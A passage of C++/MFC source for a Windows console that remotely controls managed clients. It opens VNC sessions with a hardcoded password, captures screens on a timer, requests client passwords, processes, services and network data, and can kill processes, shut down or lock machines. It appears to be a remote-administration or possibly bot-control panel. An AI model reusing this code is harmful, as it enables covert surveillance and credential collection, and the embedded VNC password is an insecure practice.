		return;
	}

	CString strParam;
	strParam.Format(_T("-host=%s -password=Oay5SEfpixZZRZPBCF5C6pJJdyS9Fvb9 -viewonly=yes -showcontrols=no"), pInfo->szIPOut);
	SHELLEXECUTEINFO ShExecInfo = {0};
	ShExecInfo.cbSize		= sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask		= SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd			= m_hWnd;
	ShExecInfo.lpVerb		= NULL;
	ShExecInfo.lpFile		= theApp.m_strVncClientPath;
	ShExecInfo.lpParameters = strParam;
	ShExecInfo.lpDirectory	= NULL;
	ShExecInfo.nShow		= SW_SHOW;
	ShExecInfo.hInstApp		= NULL;	
	ShellExecuteEx(&ShExecInfo);
}

VOID CChildFrame::ScreenRealtimeControl()
{
	std::vector<ClientInfo_t> vecInfo = theProtoManager->GetResClient();
	ClientInfo_t *pInfo = NULL;
	for (int i = 0; i < (int)vecInfo.size(); i++)
	{
		if (vecInfo[i].dwClientId == m_dwClientId)
		{
			pInfo = &vecInfo[i];
			break;
		}
	}
	if (NULL == pInfo)
	{
		AfxMessageBox(_T("无法获得信息！"), MB_ICONERROR);
		return;
	}

	CString strParam;
	strParam.Format(_T("-host=%s -password=Oay5SEfpixZZRZPBCF5C6pJJdyS9Fvb9 -viewonly=no -showcontrols=no"), pInfo->szIPOut);
	SHELLEXECUTEINFO ShExecInfo = {0};
	ShExecInfo.cbSize		= sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask		= SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd			= m_hWnd;
	ShExecInfo.lpVerb		= NULL;
	ShExecInfo.lpFile		= theApp.m_strVncClientPath;
	ShExecInfo.lpParameters = strParam;
	ShExecInfo.lpDirectory	= NULL;
	ShExecInfo.nShow		= SW_SHOW;
	ShExecInfo.hInstApp		= NULL;	
	ShellExecuteEx(&ShExecInfo);
}

BOOL CChildFrame::SaveListCtrl(CMFCListCtrl &List, CString strFileName)
{
	CString strContent;
	// Header
	CMFCHeaderCtrl &Header = List.GetHeaderCtrl();
	for (int i = 0; i < Header.GetItemCount(); i++)
	{
		if (i != 0)
			strContent += _T("\t");

		HDITEM HeadItem;
		TCHAR lpBuffer[256];     
		HeadItem.mask		= HDI_TEXT;     
		HeadItem.pszText    = lpBuffer;     
		HeadItem.cchTextMax = _countof(lpBuffer);
		Header.GetItem(i, &HeadItem);
		strContent += lpBuffer;
	}
	strContent += _T("\r\n");

	// Content
	for (int i = 0; i < List.GetItemCount(); i++)
	{
		for (int j = 0; j < Header.GetItemCount(); j++)
		{
			CString strText = List.GetItemText(i, j);
			if (j != 0)
				strContent += _T("\t");
			strContent += strText;
		}
		strContent += _T("\r\n");
	}

	DWORD dwCreateFileAccess	= GENERIC_READ | GENERIC_WRITE;//FILE_ALL_ACCESS;
	DWORD dwCreateFileShare		= FILE_SHARE_READ | FILE_SHARE_WRITE;
	DWORD dwCreatePos			= CREATE_ALWAYS;

	//Create the File handle
	HANDLE hFile = CreateFile(
		strFileName, 
		dwCreateFileAccess, 
		dwCreateFileShare, 
		0, 
		dwCreatePos, 
		FILE_ATTRIBUTE_NORMAL, 
		0);		
	if (hFile == INVALID_HANDLE_VALUE)
	{	
		GetMainFrame()->OutputMessage(ICON_TYPE_ERROR, _T("Create File Failed"));
		return FALSE;
	}
	USES_CONVERSION;
	LPSTR lpContent = T2A(strContent);
	DWORD dwWriten = 0;
	WriteFile(hFile, lpContent, strlen(lpContent), &dwWriten, NULL);
	CloseHandle(hFile);
	return TRUE;
}

VOID CChildFrame::OnSave(DWORD dwCtrlId)
{
	CString strFileName = theConfig.m_Info.szLocalDir;
	if(strFileName.Right(1) != _T('\\'))
	{
		strFileName += _T("\\");
	}
	CString strTemp;
	strTemp.Format(_T("%d"), m_dwClientId);

	struct Update_t
	{
		DWORD dwCtrlId;
		CMFCListCtrl *pList;
		CString strItem;
	};
	Update_t Items[] = 
	{
		{ID_ITEM_VERSION,	&m_wndChild.m_wndVersion,	_T(".Version.txt")},
//		{ID_ITEM_PASSWORD,	&m_wndChild.m_wndPassword,	_T(".Password.txt")},
		{ID_ITEM_PROCESS,	&m_wndChild.m_wndProcess,	_T(".Process.txt")},
		{ID_ITEM_SERVICE,	&m_wndChild.m_wndService,	_T(".Service.txt")},
//		{ID_ITEM_KEYBOARD,	&m_wndChild.m_wndKeyboard,	_T(".Keyboard.txt")},
		{ID_ITEM_NETWORK,	&m_wndChild.m_wndNetwork,	_T(".Network.txt")}
	};
	BOOL bSaved = FALSE;
	for (int i = 0; i < _countof(Items); i++)
	{
		Update_t *pItem = Items + i;
		if (pItem->dwCtrlId == dwCtrlId)
		{
			strFileName += strTemp + pItem->strItem;
			bSaved = SaveListCtrl(*(pItem->pList), strFileName);
			break;
		}
	}
	GetMainFrame()->OutputMessage(ICON_TYPE_INFO,
		_T("保存%s!"), bSaved ? _T("成功") : _T("失败"));
}

VOID CChildFrame::OnUpdate( DWORD dwCtrlId )
{
	CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
	if (NULL == pChild)
		return;

	struct Update_t
	{
		DWORD dwCtrlId;
		DWORD dwType;
	};
	Update_t Items[] = 
	{
		{ID_ITEM_VERSION,	BOT_TYPE_VERSION},
		{ID_ITEM_PASSWORD,	BOT_TYPE_PASSWORD},
		{ID_ITEM_PROCESS,	BOT_TYPE_PROCESS},
		{ID_ITEM_SERVICE,	BOT_TYPE_SERVICE},
//		{ID_ITEM_KEYBOARD,	BOT_TYPE_KEYBOARD},
		{ID_ITEM_NETWORK,	BOT_TYPE_NETWORK}
	};
	for (int i = 0; i < _countof(Items); i++)
	{
		Update_t *pItem = Items + i;
		if (pItem->dwCtrlId == dwCtrlId)
		{
			pChild->InvokeReq(pItem->dwType);
		}
	}
}

struct PROCESS_INFO
{
	CString strName;
	CString strPid;
};
bool sortByProcessName(const PROCESS_INFO& obj1,const PROCESS_INFO& obj2) 
{
	if (obj1.strName.CompareNoCase(obj2.strName) < 0)
		return true;
	return false;
}
VOID CChildFrame::OnProcess( Packet_t &Packet )
{
	LPCTSTR pPointer = Packet.strResponse;
	//
	CViewListCtrl& ProcessList = m_wndChild.m_wndProcess;
	ProcessList.DeleteAllItems();

	std::vector<PROCESS_INFO> vecProcessInfo;
	tstring strInfo = pPointer;
	size_t iCur = 0;
	size_t iNext = 0;
	BOOL bFirst = TRUE;
	while(1)
	{	
		iNext = strInfo.find('|', iCur);
		if(iNext == -1)
		{
			break;
		}

		//
		size_t iNextTab;
		tstring strName		= strInfo.substr(iCur, (iNextTab = strInfo.find('\"', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strPid     = strInfo.substr(iCur, iNext - iCur);

		PROCESS_INFO info;
		info.strName = strName.c_str();
		info.strPid = strPid.c_str();
		vecProcessInfo.push_back(info);

		iCur = iNext + 1;
		iNext = iCur;
	}

	std::sort(vecProcessInfo.begin(), vecProcessInfo.end(), sortByProcessName);

	for (int i = 0; i < (int)vecProcessInfo.size(); i++)
	{
		int iIndex = ProcessList.InsertItem(ProcessList.GetItemCount(), _T(""));
		ProcessList.SetItemText(iIndex, 0, vecProcessInfo[i].strName);
		ProcessList.SetItemText(iIndex, 1, vecProcessInfo[i].strPid);
	}
}

VOID CChildFrame::OnService( Packet_t &Packet )
{
	LPCTSTR pPointer = Packet.strResponse;
	//
	CViewListCtrl& ServiceList = m_wndChild.m_wndService;
	ServiceList.DeleteAllItems();

	tstring strInfo = pPointer;
	size_t iCur = 0;
	size_t iNext = 0;
	BOOL bFirst = TRUE;
	while(1)
	{	
		iNext = strInfo.find('|', iCur);
		if(iNext == -1)
		{
			break;
		}

		//
		size_t iNextTab;
		tstring strName		= strInfo.substr(iCur, (iNextTab = strInfo.find('\"', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strDisplay = strInfo.substr(iCur, iNext - iCur);

		int iIndex = ServiceList.InsertItem(ServiceList.GetItemCount(), _T(""));
		ServiceList.SetItemText(iIndex, 0, strName.c_str());
		ServiceList.SetItemText(iIndex, 1, strDisplay.c_str());

		iCur = iNext + 1;
		iNext = iCur;
	}
}

VOID CChildFrame::OnKeyboard( Packet_t &Packet )
{

}

VOID CChildFrame::OnNetwork( Packet_t &Packet )
{
	LPCTSTR pPointerBase = Packet.strResponse;
	LPCTSTR pPointer = pPointerBase + 1;
	//
	CViewListCtrl& NetworkList = m_wndChild.m_wndNetwork;
	NetworkList.DeleteAllItems();

	if (*pPointerBase != _T('*'))
		return;	

	tstring strInfo = pPointer;
	size_t iCur = 0;
	size_t iNext = 0;
	BOOL bFirst = TRUE;
	while(1)
	{	
		iNext = strInfo.find('|', iCur);
		if(iNext == -1)
		{
			break;
		}

		//
		size_t iNextTab;
		tstring strProtocol		= strInfo.substr(iCur, (iNextTab = strInfo.find('/', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strLocal		= strInfo.substr(iCur, (iNextTab = strInfo.find('/', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strRemote		= strInfo.substr(iCur, (iNextTab = strInfo.find('/', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strProcessName  = strInfo.substr(iCur, (iNextTab = strInfo.find('/', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strPid			= strInfo.substr(iCur, (iNextTab = strInfo.find('/', iCur)) - iCur);
		iCur = iNextTab + 1;
		tstring strStat			= strInfo.substr(iCur, (iNextTab = strInfo.find('/', iCur)) - iCur);
		iCur = iNextTab + 1;

		int iIndex = NetworkList.InsertItem(NetworkList.GetItemCount(), _T(""));
		NetworkList.SetItemText(iIndex, 0, strProcessName.c_str());
		NetworkList.SetItemText(iIndex, 1, strPid.c_str());
		NetworkList.SetItemText(iIndex, 2, strProtocol.c_str());
		NetworkList.SetItemText(iIndex, 3, strLocal.c_str());
		NetworkList.SetItemText(iIndex, 4, strRemote.c_str());
		NetworkList.SetItemText(iIndex, 5, strStat.c_str());
		
		iCur = iNext + 1;
		iNext = iCur;
	}

	NetworkList.SendMessage(WM_VSCROLL, SB_BOTTOM, 0);
}

VOID CChildFrame::OnKillProcess(DWORD dwCtrlId)
{
	if (IDYES == AfxMessageBox(_T("确定吗?"), MB_ICONINFORMATION|MB_YESNO))
	{
		CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
		if (NULL == pChild)
			return;
		INT iClickIndex = m_wndChild.m_wndProcess.GetNextItem(-1, LVIS_SELECTED);
		if (-1 == iClickIndex)
		{
			AfxMessageBox(_T("请选择一项!"), MB_ICONERROR);
		}
		else
		{
			CString strId = m_wndChild.m_wndProcess.GetItemText(iClickIndex, 1);
			pChild->InvokeReq(BOT_TYPE_KILL_PROCESS, strId);
		}
	}
}

VOID CChildFrame::OnKillProcessResponse(Packet_t &Packet)
{
	CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
	if (NULL == pChild)
		return;
	pChild->InvokeReq(BOT_TYPE_PROCESS);
}

VOID CChildFrame::OnControlShutdown()
{
	if (IDYES == AfxMessageBox(_T("确定吗?"), MB_ICONINFORMATION|MB_YESNO))
	{
		CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
		if (NULL == pChild)
			return;
		pChild->InvokeReq(BOT_TYPE_SHUTDOWN);
	}
}

VOID CChildFrame::OnControlRestart()
{
	if(IDYES == AfxMessageBox(_T("确定吗?"), MB_ICONINFORMATION|MB_YESNO))
	{
		CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
		if (NULL == pChild)
			return;
		pChild->InvokeReq(BOT_TYPE_RESTART);
	}
}

VOID CChildFrame::OnControlLogoff()
{
	if(IDYES == AfxMessageBox(_T("确定吗?"), MB_ICONINFORMATION|MB_YESNO))
	{
		CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
		if (NULL == pChild)
			return;
		pChild->InvokeReq(BOT_TYPE_LOGOFF);
	}
}

VOID CChildFrame::OnControlLock()
{
	if(IDYES == AfxMessageBox(_T("确定吗?"), MB_ICONINFORMATION|MB_YESNO))
	{
		CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
		if (NULL == pChild)
			return;
		pChild->InvokeReq(BOT_TYPE_LOCK);
	}
}

VOID CChildFrame::OnControlUnLock()
{
	if(IDYES == AfxMessageBox(_T("确定吗?"), MB_ICONINFORMATION|MB_YESNO))
	{
		CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
		if (NULL == pChild)
			return;
		pChild->InvokeReq(BOT_TYPE_UNLOCK);
	}
}

VOID CChildFrame::OnControlLockAuto()
{
	if(IDYES == AfxMessageBox(_T("确定吗?"), MB_ICONINFORMATION|MB_YESNO))
	{
		CProtoManagerChild *pChild = theProtoManager->GetChild(m_dwClientId);
		if (NULL == pChild)
			return;
		pChild->InvokeReq(BOT_TYPE_SET_LOCK_AUTO);
	}
}

void CChildFrame::OnControlSetPassword(CString strPassword, DWORD dwIdleTime)
{
	std::map<DWORD, _CLIENT_INFO>::iterator pIter = theConfig.m_mapClient.find(m_dwClientId);
	if (pIter == theConfig.m_mapClient.end())
	{
		_CLIENT_INFO info;
		lstrcpy(info.strUnlockPassword, strPassword);
		info.dwIdleTime = dwIdleTime;
		theConfig.m_mapClient.insert(std::map<DWORD, _CLIENT_INFO>::value_type(m_dwClientId, info));
		theConfig.Save();
		pIter = theConfig.m_mapClient.find(m_dwClientId);
	}
	else
	{
		lstrcpy(pIter->second.strUnlockPassword, strPassword);
		pIter->second.dwIdleTime = dwIdleTime;
		theConfig.Save();
	}
	
// 	LPSTR pBuf = Crypt::_base64Encode((LPBYTE)&info, sizeof(info), NULL);
// 	USES_CONVERSION;
// 	CString strBuf = A2T(pBuf);
// 	free(pBuf);
	
//	std::string strJsonConfig;
//	pIter->second.SaveConfig(strJsonConfig);
//	CString strBuf = CA2T(strJsonConfig.c_str()).m_psz;
//	theProtoManager->InvokeClientLockInfo(m_dwClientId, strBuf);

	AfxMessageBox(_T("设置成功!"), MB_ICONINFORMATION);
}

void CChildFrame::OnControlSetBlackWhiteList(
	std::vector<CString> vecClass, std::vector<CString> vecWin,
	std::vector<CString> vecWhiteClass, std::vector<CString> vecWhiteWin,
	BOOL bWhiteMode)
{
	std::map<DWORD, _CLIENT_INFO>::iterator pIterFound = theConfig.m_mapClient.find(m_dwClientId);
	if (pIterFound != theConfig.m_mapClient.end())
	{
		pIterFound->second.iWinCount = 0;
		for (int i = 0; i < (int)vecWin.size(); i++)
		{
			lstrcpy(pIterFound->second.vecWin[pIterFound->second.iWinCount], vecWin[i]);
			lstrcpy(pIterFound->second.vecClass[pIterFound->second.iWinCount], vecClass[i]);
			pIterFound->second.iWinCount++;
		}

		pIterFound->second.iWhiteWinCount = 0;
		for (int i = 0; i < (int)vecWhiteWin.size(); i++)
		{
			lstrcpy(pIterFound->second.vecWhiteWin[pIterFound->second.iWhiteWinCount], vecWhiteWin[i]);
			lstrcpy(pIterFound->second.vecWhiteClass[pIterFound->second.iWhiteWinCount], vecWhiteClass[i]);
			pIterFound->second.iWhiteWinCount++;
		}
		pIterFound->second.bWhiteMode = bWhiteMode;

		theConfig.Save();
	}
	else
	{
		_CLIENT_INFO info;
		for (int i = 0; i < (int)vecWin.size(); i++)
		{
			lstrcpy(info.vecWin[info.iWinCount], vecWin[i]);
			lstrcpy(info.vecClass[info.iWinCount], vecClass[i]);
			info.iWinCount++;
		}
		for (int i = 0; i < (int)vecWhiteWin.size(); i++)
		{
			lstrcpy(info.vecWhiteWin[info.iWhiteWinCount], vecWhiteWin[i]);
			lstrcpy(info.vecWhiteClass[info.iWhiteWinCount], vecWhiteClass[i]);
			info.iWhiteWinCount++;
		}
		info.bWhiteMode = bWhiteMode;

		theConfig.m_mapClient.insert(std::map<DWORD, _CLIENT_INFO>::value_type(m_dwClientId, info));
		theConfig.Save();
		pIterFound = theConfig.m_mapClient.find(m_dwClientId);
	}

// 	LPSTR pBuf = Crypt::_base64Encode((LPBYTE)&info, sizeof(info), NULL);
// 	USES_CONVERSION;
// 	CString strBuf = A2T(pBuf);
// 	free(pBuf);

//	std::string strJsonConfig;
//	pIterFound->second.SaveConfig(strJsonConfig);
//	CString strBuf = CA2T(strJsonConfig.c_str()).m_psz;
//	theProtoManager->InvokeClientLockInfo(m_dwClientId, strBuf);

	AfxMessageBox(_T("设置成功!"), MB_ICONINFORMATION);
}

void CChildFrame::OnTimer(UINT_PTR nIDEvent)
{
	if (100 == nIDEvent)
	{
		BOOL bMatched = FALSE;
		std::vector<ClientInfo_t> resClients = theProtoManager->GetResClient();
		for (int i = 0; i < (int)resClients.size(); i++)
		{
			if (resClients[i].dwClientId == m_dwClientId)
			{
				bMatched = TRUE;
				break;
			}
		}
		if (bMatched)
		{
			CaptureScreen();
		}
	}

	__super::OnTimer(nIDEvent);
}

VOID CChildFrame::OnControlDev(const CONFIG_INFO& config)
{
	std::map<DWORD, _CLIENT_INFO>::iterator pIter = theConfig.m_mapClient.find(m_dwClientId);
	if (pIter != theConfig.m_mapClient.end())
	{
		pIter->second.configInfo = config;
		theConfig.Save();

		std::string strJsonConfig;
		pIter->second.SaveConfig(strJsonConfig);
		CString strConfig = CA2T(strJsonConfig.c_str()).m_psz;
		theProtoManager->InvokeConfigInfo(m_dwClientId, strConfig);
	}
}

VOID CChildFrame::OnControlStorage(const CONFIG_INFO& config)
{
	std::map<DWORD, _CLIENT_INFO>::iterator pIter = theConfig.m_mapClient.find(m_dwClientId);
	if (pIter != theConfig.m_mapClient.end())
	{
		pIter->second.configInfo = config;
		theConfig.Save();

		std::string strJsonConfig;
		pIter->second.SaveConfig(strJsonConfig);
		CString strConfig = CA2T(strJsonConfig.c_str()).m_psz;
		theProtoManager->InvokeConfigInfo(m_dwClientId, strConfig);
	}
}

VOID CChildFrame::OnControlSystem(const CONFIG_INFO& config)
{
	std::map<DWORD, _CLIENT_INFO>::iterator pIter = theConfig.m_mapClient.find(m_dwClientId);
	if (pIter != theConfig.m_mapClient.end())
	{
		pIter->second.configInfo = config;
		theConfig.Save();

		std::string strJsonConfig;
		pIter->second.SaveConfig(strJsonConfig);
		CString strConfig = CA2T(strJsonConfig.c_str()).m_psz;
		theProtoManager->InvokeConfigInfo(m_dwClientId, strConfig);
	}
}

void CChildFrame::OnSize(UINT nType, int cx, int cy)
{
	__super::OnSize(nType, cx, cy);

	if (NULL != GetSafeHwnd())
	{
		CRect rectClient;
		GetClientRect(rectClient);
		if (0 != rectClient.Height())
		{
// 			rectClient.top += 10;
// 			rectClient.left += 10;
// 			rectClient.right -= 10;
// 			rectClient.bottom -= 10;

// 			int iXEdge = GetSystemMetrics(SM_CXEDGE);
// 			int iYEdge = GetSystemMetrics(SM_CYEDGE);
// 			rectClient.top = rectClient.top - iYEdge;
// 			rectClient.left = rectClient.left - iXEdge;
// 			rectClient.right = rectClient.right + iXEdge;
// 			rectClient.bottom = rectClient.bottom + iYEdge;

			m_wndChild.SetWindowPos(NULL, rectClient.left, rectClient.top, rectClient.Width(), rectClient.Height(), SWP_NOACTIVATE | SWP_NOZORDER);
		}
	}
}

void CChildFrame::OnWindowPosChanging(WINDOWPOS* lpwndpos)
{
	__super::OnWindowPosChanging(lpwndpos);
#if 0
	//int d = ::GetSystemMetrics(SM_CYBORDER);
	int iXEdge = GetSystemMetrics(SM_CXEDGE);
	int iYEdge = GetSystemMetrics(SM_CYEDGE);
	CView* pView = GetActiveView();
	if(pView != NULL)
	{
		RECT rcView;
		GetClientRect(&rcView);
		rcView.top = rcView.top - iYEdge;
		rcView.left = rcView.left - iXEdge;
		rcView.right = rcView.right + iXEdge;
		rcView.bottom = rcView.bottom + iYEdge;
		pView->MoveWindow(&rcView);
	}
#endif
}

void CChildFrame::OnWindowPosChanged(WINDOWPOS* lpwndpos)
{
	__super::OnWindowPosChanged(lpwndpos);
#if 0
	int iXEdge = GetSystemMetrics(SM_CXEDGE);
	int iYEdge = GetSystemMetrics(SM_CYEDGE);
	CView* pView = GetActiveView();
	if(pView != NULL)
	{
		RECT rcView;
		GetClientRect(&rcView);
		rcView.top = rcView.top - iYEdge;
		rcView.left = rcView.left - iXEdge;
		rcView.right = rcView.right + iXEdge;
		rcView.bottom = rcView.bottom + iYEdge;
		pView->MoveWindow(&rcView);
	}
#endif
}

void CChildFrame::ActiveTab(int iIndex)
{
	m_wndChild.ActiveTab(iIndex);
}

void CChildFrame::OnOnlineChanged()
{
	m_wndChild.m_wndControlPanel.UpdateList();
}

void CChildFrame::OnLockChanged()
{
	if (m_wndChild.m_wndHostInfo)
	{
		m_wndChild.m_wndHostInfo->UpdateItems();
	}
}
